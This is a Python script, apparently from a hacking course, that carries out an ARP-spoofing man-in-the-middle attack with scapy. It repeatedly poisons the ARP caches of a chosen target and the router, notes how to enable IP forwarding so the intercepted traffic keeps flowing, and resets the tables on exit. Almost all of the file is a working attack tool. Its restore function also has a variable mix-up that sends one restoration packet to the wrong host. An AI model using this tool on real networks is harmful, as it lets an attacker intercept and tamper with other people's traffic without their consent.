#!/usr/bin/env python

import argparse
import scapy.all as scapy
# import sys # Python 2.7
import time

def do_arp_restore(str_ip_destination, str_ip_source):
    ## Get the MAC Address of the target IP
    str_mac_destination = get_mac(str_ip_destination)
    str_mac_source = get_mac(str_ip_source)
    ## Check available objects that can be used in scapy.ARP class
    # scapy.ls(scapy.ARP)
    ## 1. Create an ARP Packet
    ## op=2 is for response (op=1 is for request (Default))
    ## pdst is the Target IP
    ## hwdst is the Target MAC
    ## hwsrc is set to attacker MAC by default (This needs to be changed)
    ## psrc is the Access Point AP
    obj_packet_arp = scapy.ARP(op=2, pdst=str_ip_target, hwdst=str_mac_destination, psrc=str_ip_source, hwsrc=str_mac_source)
    ## Check the packet details
    # print(obj_packet_arp.show())
    # print(obj_packet_arp.summary())
    ## Send the ARP packet
    # scapy.send(obj_packet_arp)
    try:
        scapy.send(obj_packet_arp, count=4, verbose=False) ## Make the packet sending silent
    except:
        print("[X] Packet sending for restoration failed.")

def do_arp_spoof(str_ip_target, str_ip_ap ):
    ## Get the MAC Address of the target IP
    str_mac_target = get_mac(str_ip_target)
    ## Check available objects that can be used in scapy.ARP class
    # scapy.ls(scapy.ARP)
    ## 1. Create an ARP Packet
    ## op=2 is for response (op=1 is for request (Default))
    ## pdst is the Target IP
    ## hwdst is the Target MAC
    ## hwsrc is set to attacker MAC by default
    ## psrc is the Access Point AP
    obj_packet_arp = scapy.ARP(op=2, pdst=str_ip_target, hwdst=str_mac_target, psrc=str_ip_ap)
    ## Check the packet details
    # print(obj_packet_arp.show())
    # print(obj_packet_arp.summary())
    ## Send the ARP packet
    # scapy.send(obj_packet_arp)
    try:
        scapy.send(obj_packet_arp, verbose=False) ## Make the packet sending silent
    except:
        print("[X] Packet sending failed.")

def get_arguments():
    obj_parser = argparse.ArgumentParser(
        prog='ARP Spoofer',
        description='Execute MITM',
        epilog='Tested with Windows-based targets'
    )
    obj_parser.add_argument("-a", "--access-point", dest="ap", help="Access Point IPv4 Address (E.g. Router)", required=True)
    obj_parser.add_argument("-t", "--target", dest="target", help="Target IPv4 Address", required=True)
    options = obj_parser.parse_args()
    return options

def get_mac(str_ip):
    ## Codes are referenced from network-scanner
    obj_arp_request = scapy.ARP(pdst=str_ip)
    obj_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    obj_arp_broadcast = obj_broadcast/obj_arp_request
    # list_response_answered, list_response_unanswered = scapy.srp(obj_arp_broadcast, timeout=1)
    list_response_answered = scapy.srp(obj_arp_broadcast, timeout=1, verbose=False)[0]
    if list_response_answered:
        ## Get the first element (0) and the answered (1) variables. From there we only need the MAC Address (hwsrc)
        return list_response_answered[0][1].hwsrc
    else:
        return None

int_packet_count = 0
obj_options = get_arguments()
str_ip_ap = obj_options.ap # "192.168.1.1"
str_ip_target = obj_options.target # "192.168.1.5"
# str_mac_ap = "52:54:00:12:35:00"
# str_mac_target = "08:00:27:08:af:07"

## Enable Port Forwarding from attacker machine
## Linux: echo 1 > /proc/sys/net/ipv4/ip_forward

## Try-Catch was used to enable keyboard exception handling
try:
    ## Enable persistence, as one execution is not enough.
    while True:
        ## Tell the target that you are the AP
        do_arp_spoof(str_ip_target, str_ip_ap)
        int_packet_count = int_packet_count + 1
        ## Tell the AP that you are the target
        do_arp_spoof(str_ip_ap, str_ip_target)
        int_packet_count = int_packet_count + 1
        ## Print packet sending
        # print("[+] Sent " + str(int_packet_count) + " packets")
        ## Print packet sending in buffer
        # print("\r" + "[+] Sent " + str(int_packet_count) + " packets"), # Python 2.7
        print("\r" + "[+] Sent " + str(int_packet_count) + " packets", end="") # Python 3+
        ## Tell system to flush the buffer and print to screen
        # sys.stdout.flush() # Python 2.7
        time.sleep(2)
except KeyboardInterrupt:
    print("\n" + "[.] Detected CTRL+C... Resetting ARP Tables")
    do_arp_restore(str_ip_target, str_ip_ap)
    do_arp_restore(str_ip_ap, str_ip_target)